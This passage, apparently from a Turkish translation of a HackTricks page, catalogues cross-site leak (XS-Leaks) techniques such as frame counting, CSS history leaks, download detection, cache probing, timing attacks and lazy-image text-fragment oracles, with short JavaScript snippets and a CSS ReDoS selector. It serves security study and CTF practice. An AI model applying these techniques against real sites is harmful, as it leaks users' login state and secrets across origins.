await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** `window.length` özelliğini inceleyerek iframe öğelerinin miktarını değerlendirin.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` aracılığıyla açılan bir webdeki **çerçeve sayısını** saymak, kullanıcının o sayfadaki **durumunu** belirlemeye yardımcı olabilir.\
Ayrıca, sayfa her zaman aynı sayıda çerçeveye sahipse, çerçeve sayısını **sürekli** kontrol etmek, bilgi sızdırabilecek bir **deseni** belirlemeye yardımcı olabilir.

Bu tekniğin bir örneği, Chrome'da bir **PDF**'nin **çerçeve sayımı** ile **tespit edilebilmesidir** çünkü dahili olarak bir `embed` kullanılır. `zoom`, `view`, `page`, `toolbar` gibi içeriği kontrol etmeye olanak tanıyan [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardır; bu teknik ilginç olabilir.

### HTMLElements

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** İki olası durumu ayırt etmek için sızdırılan değeri okuyun.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanları aracılığıyla bilgi sızdırılması, özellikle kullanıcı bilgilerine dayalı dinamik medya dosyaları oluşturulduğunda veya medya boyutunu değiştiren filigranlar eklendiğinde web güvenliği açısından bir endişe kaynağıdır. Bu, belirli HTML elemanları tarafından açığa çıkan bilgileri analiz ederek olası durumları ayırt etmek için saldırganlar tarafından istismar edilebilir.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Bu eleman, medyanın `duration` ve `buffered` sürelerini açığa çıkarır; bunlara API'si aracılığıyla erişilebilir. [HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` ve `videoWidth` değerlerini açığa çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur; bu da medya içeriği hakkında daha derinlemesine bilgi sunar. [HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Bu fonksiyon, video oynatma kalitesi hakkında bilgiler sağlar; `totalVideoFrames` gibi, işlenen video verisinin miktarını gösterebilir. [getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Bu eleman, bir resmin `height` ve `width` değerlerini sızdırır. Ancak, bir resim geçersizse, bu özellikler 0 döner ve `image.decode()` fonksiyonu reddedilir; bu da resmin düzgün bir şekilde yüklenmediğini gösterir. [HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Kullanıcının durumu veya statüsü ile ilişkili web sitesi stilindeki değişiklikleri belirleyin.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, kullanıcının durumuna bağlı olarak web sitesi stilini değiştirebilir. Saldırgan sayfasında **HTML link elemanı** ile çapraz kökenli CSS dosyaları gömülebilir ve **kurallar** saldırgan sayfasına **uygulanır**. Eğer bir sayfa bu kuralları dinamik olarak değiştirirse, bir saldırgan, kullanıcı durumuna bağlı olarak bu **farklılıkları** **tespit edebilir**.\
Bir sızıntı tekniği olarak, saldırgan belirli bir HTML elemanının CSS özelliklerini **okumak için** `window.getComputedStyle` yöntemini kullanabilir. Sonuç olarak, etkilenen eleman ve özellik adı biliniyorsa, saldırgan rastgele CSS özelliklerini okuyabilir.

### CSS History

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Daha önce ziyaret edilmiş bir URL'ye `:visited` stilinin uygulanıp uygulanmadığını tespit edin.
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> [**Bu**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) kaynağa göre, bu başsız Chrome'da çalışmıyor.

CSS `:visited` seçici, daha önce kullanıcı tarafından ziyaret edilmiş URL'leri farklı şekilde stilize etmek için kullanılır. Geçmişte, bu stil farklılıklarını belirlemek için `getComputedStyle()` yöntemi kullanılabiliyordu. Ancak, modern tarayıcılar, bu yöntemin bir bağlantının durumunu açığa çıkarmasını önlemek için güvenlik önlemleri uygulamıştır. Bu önlemler, bağlantının ziyaret edilmiş gibi görünmesini sağlamak ve `:visited` seçici ile uygulanabilecek stilleri kısıtlamak gibi önlemleri içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak ayırt etmek mümkündür. Bir teknik, kullanıcıyı CSS'den etkilenen bir alanla etkileşime girmeye ikna etmeyi içerir; özellikle `mix-blend-mode` özelliğini kullanarak. Bu özellik, öğelerin arka planlarıyla karışmasını sağlar ve kullanıcı etkileşimine bağlı olarak ziyaret edilmiş durumu açığa çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan bağlantıların render sürelerini istismar ederek tespit sağlanabilir. Tarayıcılar, ziyaret edilmiş ve ziyaret edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu, render süresinde ölçülebilir bir zaman farkı yaratabilir. Bir kanıt konsepti (PoC), bu tekniği zaman farkını artırmak için birden fazla bağlantı kullanarak gösteren bir Chromium hata raporunda belirtilmiştir; böylece ziyaret edilmiş durum zaman analizi ile tespit edilebilir hale gelir.

Bu özellikler ve yöntemler hakkında daha fazla bilgi için belgelerine göz atın:

- `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlıklar
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** Google Chrome'da, X-Frame-Options kısıtlamaları nedeniyle bir sayfanın çapraz kökenli bir sitede gömülmesi engellendiğinde özel bir hata sayfası görüntülenir.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömüldüğünde, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için boş bir belge nesnesi (null yerine) döner; bu, iframe'lerde veya diğer tarayıcılarda böyle değildir. Saldırganlar, boş belgeyi tespit ederek bunu istismar edebilir ve kullanıcının durumu hakkında bilgi açığa çıkarabilir; özellikle geliştiriciler X-Frame-Options başlığını tutarsız bir şekilde ayarladıklarında, genellikle hata sayfalarını göz ardı ederler. Güvenlik başlıklarının farkında olmak ve tutarlı bir şekilde uygulanması, bu tür sızıntıları önlemek için kritik öneme sahiptir.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Başlıklar
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilirliği, dosya indirmenin başarılı olduğunu gösterir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği görüntülemek yerine indirmesi talimatını verir. Bu davranış, bir kullanıcının dosya indirmesini tetikleyen bir sayfaya erişip erişmediğini tespit etmek için istismar edilebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik vardır:

1. **İndirme Çubuğu İzleme**:
- Chromium tabanlı tarayıcılarda bir dosya indirildiğinde, tarayıcı penceresinin alt kısmında bir indirme çubuğu görünür.
- Pencere yüksekliğindeki değişiklikleri izleyerek, saldırgan indirme çubuğunun görünümünü çıkarabilir; bu, bir indirmenin başlatıldığını gösterir.
2. **Iframe ile İndirme Navigasyonu**:
- Bir sayfa `Content-Disposition: attachment` başlığını kullanarak bir dosya indirmesini tetiklediğinde, bu bir navigasyon olayı oluşturmaz.
- İçeriği bir iframe içinde yükleyerek ve navigasyon olaylarını izleyerek, içerik durumunun bir dosya indirmesine neden olup olmadığını kontrol etmek mümkündür (navigasyon yok) veya olmadığını kontrol edebilirsiniz.
3. **Iframe Olmadan İndirme Navigasyonu**:
- Iframe tekniğine benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanmayı içerir.
- Yeni açılan penceredeki navigasyon olaylarını izlemek, bir dosya indirmenin tetiklenip tetiklenmediğini (navigasyon yok) veya içeriğin satır içi olarak görüntülenip görüntülenmediğini (navigasyon gerçekleşir) ortaya çıkarabilir.

Sadece giriş yapmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler, tarayıcının indirme isteğine verdiği yanıt temelinde kullanıcının kimlik doğrulama durumunu dolaylı olarak çıkarabilir.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilirliği, dosya indirmenin başarılı olduğunu gösterir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Bu tekniğin ilginç olmasının nedeni: Chrome artık **önbellek bölümlendirmesi** yapıyor ve yeni açılan sayfanın önbellek anahtarı: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`; ancak bir ngrok sayfası açıp içinde fetch kullanırsam, önbellek anahtarı: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)` olacaktır; **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılmaz. Daha fazla ayrıntıyı burada bulabilirsiniz: [Önbelleği bölümlendirerek güvenlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Eğer bir site `example.com`, `*.example.com/resource` adresinden bir kaynak içeriyorsa, o kaynak, doğrudan **üst düzey navigasyon** ile talep edilmiş gibi **aynı önbellek anahtarına** sahip olacaktır. Çünkü önbellek anahtarı, üst düzey _eTLD+1_ ve çerçeve _eTLD+1_'den oluşur.

Önbelleğe erişim, bir kaynağı yüklemekten daha hızlı olduğundan, bir sayfanın konumunu değiştirmeyi ve durdurduktan 20ms (örneğin) sonra iptal etmeyi denemek mümkündür. Eğer durdurduktan sonra köken değiştiyse, bu, kaynağın önbelleğe alındığı anlamına gelir.\
Ya da sadece **potansiyel olarak önbelleğe alınmış sayfaya bazı fetch'ler gönderip geçen süreyi ölçebilirsiniz**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Yönlendirmeler
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** Bir fetch isteğine verilen yanıtın bir yönlendirme olup olmadığını bulmak mümkündür.
- **Code Example**:

![](<../images/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** Bir kaynağı yüklemeye çalışmak ve yüklenmeden önce yüklemeyi kesmek mümkündür. Bir hata tetiklenip tetiklenmediğine bağlı olarak, kaynak önbelleğe alınmış ya da alınmamıştır.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

_**fetch**_ ve _**setTimeout**_ kullanarak bir **AbortController** ile hem **kaynağın önbelleğe alınıp alınmadığını** tespit etmek hem de belirli bir kaynağı tarayıcı önbelleğinden çıkarmak mümkündür. Ayrıca, bu işlem yeni içerik önbelleğe alınmadan gerçekleşir.

### Script Pollution

- **Inclusion Methods**: HTML Elemanları (script)
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** Yerleşik fonksiyonları **aşırı yazmak** ve bunların argümanlarını okumak mümkündür; bu, **çapraz kökenli script**'ten bile (doğrudan okunamaz) değerli bilgileri **sızdırabilir**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Service worker kullanarak bir webin yürütme süresini ölçün.
- **Code Example**:

Verilen senaryoda, saldırgan, kendi alanlarından biri olan "attacker.com" içinde bir **service worker** kaydetme girişiminde bulunur. Ardından, saldırgan ana belgede hedef web sitesinde yeni bir pencere açar ve **service worker**'a bir zamanlayıcı başlatmasını talimatını verir. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **service worker** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin varışında, **service worker** **204 (No Content)** durum kodu ile yanıt verir ve navigasyon sürecini etkili bir şekilde sonlandırır. Bu noktada, **service worker** daha önce ikinci adımda başlatılan zamanlayıcıdan bir ölçüm alır. Bu ölçüm, navigasyon sürecinde gecikmelere neden olan JavaScript'in süresinden etkilenir.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce sayfanın kullandığı kaynakları yükleyerek.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Bir isteği gerçekleştirmek için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** `window.open` kullanarak bir isteği gerçekleştirmek için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Re Enjeksiyon ile

Burada, çapraz kökenli HTML'den bilgi sızdırma tekniklerini bulabilirsiniz **HTML içeriği enjekte ederek**. Bu teknikler, herhangi bir nedenle **HTML enjekte edebiliyorsanız ancak JS kodu enjekte edemiyorsanız** ilginçtir.

### Dangling Markup

{{#ref}}
dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Eğer **içeriği sızdırmanız** gerekiyorsa ve **gizli olanın öncesine HTML ekleyebiliyorsanız**, **yaygın dangling markup tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenle **karakter karakter** yapmanız **GEREKİYORSA** (belki iletişim bir önbellek vuruşu aracılığıyla) bu hileyi kullanabilirsiniz.

HTML'deki **resimler**, değeri "**lazy**" olan bir "**loading**" niteliğine sahiptir. Bu durumda, resim, sayfa yüklenirken değil, görüntülendiğinde yüklenecektir:
```html
<img src=/something loading=lazy >
```
Bu nedenle, yapabileceğiniz şey **birçok gereksiz karakter eklemek** (örneğin **binlerce "W"**) ve **sayfayı gizli bilgiden önce doldurmak veya şuna benzer bir şey eklemek** `<br><canvas height="1850px"></canvas><br>.`\
Örneğin, eğer **enjeksiyonumuz bayraktan önce görünüyorsa**, **görüntü** **yüklenir**, ancak **bayraktan sonra** görünüyorsa, bayrak + gereksiz karakter **yüklenmesini engelleyecektir** (ne kadar gereksiz karakter ekleyeceğinizle oynamanız gerekecek). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) olan şeydir.

Başka bir seçenek, **scroll-to-text-fragment** kullanmak olabilir, eğer izin verilirse:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini** sağlarsınız, bir şeyle gibi
```
#:~:text=SECR
```
Web sayfası şöyle bir şey olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html, saldırganın gereksiz karakterlerini ve tembel yükleme görüntüsünü içerir ve ardından botun sırrı eklenir.

Bu metin, botun sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlayacaktır. Bu metin sırdır ve **görüntünün hemen altında** yer almaktadır, **gizli kelime doğru tahmin edilirse görüntü yalnızca yüklenecektir**. Böylece, **sırrı karakter karakter dışarı sızdırmak için oracliniz var**.

Bunu istismar etmek için bazı kod örnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Görüntü Tembel Yükleme Zamanına Dayalı

Eğer **bir dış görüntüyü yüklemek mümkün değilse**, bu, saldırgana görüntünün yüklendiğini gösterebilir, başka bir seçenek ise **karakteri birkaç kez tahmin etmeye çalışmak ve bunu ölçmektir**. Eğer görüntü yüklenirse, tüm istekler, görüntü yüklenmediğinde olduğundan daha uzun sürecektir. Bu, [**bu yazının çözümünde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **özetlenen** şeydir:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, zamanlama yoluyla **bazı HTML içeriğinin var olup olmadığını** bulmak mümkündür, çünkü eğer `main[id='site-main']` seçici eşleşmezse, geri kalan **seçicileri** kontrol etmesine gerek yoktur:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection

{{#ref}}
xs-search/css-injection/
{{#endref}}

## Defenses

Bu tekniklere karşı nasıl korunacağınız hakkında daha fazla bilgi için [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ve wiki'nin her bölümünde [https://xsleaks.dev/](https://xsleaks.dev/) önerilen önlemler bulunmaktadır.

## References

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
